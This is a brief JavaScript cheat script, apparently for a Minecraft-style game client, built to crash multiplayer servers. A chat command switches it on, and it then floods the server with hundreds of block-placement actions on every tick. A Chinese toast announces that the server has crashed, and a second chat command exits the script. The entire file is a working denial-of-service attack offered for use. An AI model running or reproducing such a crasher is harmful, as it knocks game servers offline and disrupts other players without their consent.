const id = getLocalPlayerUniqueID()
const num = 500
const pos = getEntityPos(id)
var bk = false
var tick = 0
var AutoExit = 20

function Crasher() {
	for (let i = 0;i <= num;i++) {
		buildBlock(id,pos.x,pos.y,pos.z,i + 6)
		if (tick >= AutoExit) {
			showToast("服务器已崩溃")
		}
	}
}

function onTickEvent() {
	if (bk) {
		Crasher()
		tick++
		if (tick > AutoExit) {
			tick = 0
			bk = false
		}
	}
}

function onSendChatMessageEvent(message) {
    if (message == "断开链接") {
        bk =!bk;
        return true;
    }
    if (message == "tc") {
        clientMessage('§b 已退出脚本.')
        exit();
        return true;
    }
}
